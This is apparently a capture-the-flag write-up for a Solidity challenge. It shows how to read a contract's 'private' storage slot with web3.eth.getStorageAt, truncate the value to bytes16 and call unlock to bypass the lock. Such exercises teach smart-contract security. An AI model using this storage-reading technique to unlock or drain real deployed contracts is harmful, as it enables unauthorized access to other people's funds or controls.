# Requirements

- Unlock the contract reading storage slots.

# Attack explanation

State is stored in a deterministical manner. You can define variables to be private, preventing other contracts from modifiying them but not from reading them if they make a little twist calculating storage slots.

# Attack function

We could solve the challenge by just using web3 lib:

```
bool public locked = true; // SLOT 0
uint256 public ID = block.timestamp; // SLOT 1
uint8 private flattening = 10; // SLOT 2
uint8 private denomination = 255; // SLOT 2
uint16 private awkwardness = uint16(block.timestamp); // SLOT 2
bytes32[3] private data; // SLOT 3, 4, 5
```

We need data[2] that is in slot 5.

```
function unlock(bytes16 _key) public {
require(_key == bytes16(data[2]));
locked = false;
}
```

```
await web3.eth.getStorageAt(instance, 5); // data[2] = "0x586a903638e9d6ff5116d519de1a429ca5874c5cc14c320545739926988c1718"
bytes16(data[2]) = 0x |586a903638e9d6ff5116d519de1a429c| a5874c5cc14c320545739926988c1718 = 0x586a903638e9d6ff5116d519de1a429c
contract.unlock("0x586a903638e9d6ff5116d519de1a429c");
```
